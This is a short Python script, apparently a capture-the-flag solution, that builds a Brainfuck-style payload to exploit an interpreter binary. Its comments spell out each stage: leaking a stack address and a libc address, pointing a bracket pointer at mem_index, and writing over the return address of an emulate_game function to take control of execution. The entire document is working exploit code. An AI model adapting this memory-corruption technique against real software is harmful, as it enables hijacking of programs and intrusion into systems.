payload = "[["

#leak stack address
payload += "<"*0x9
payload += ".<"*0x8

#leak libc address
payload += "<"*80
payload += ".<"*8

###point cur_bracket to mem_index
payload += ">"
payload += "<"*0x10c
payload += ",<"*4
##
###set the top 4 bytes of mem_index to 0
payload += ">"
###set bottom 4 to length of program up to this point (0x192 currently)
payload += "["
##
##
###point to return address of emulate_game
#payload += "<"*(0x190-0x148-0x10+2)
payload += "<"*(2)
payload += ",<"*120

print(str(len(payload)))
print(payload)
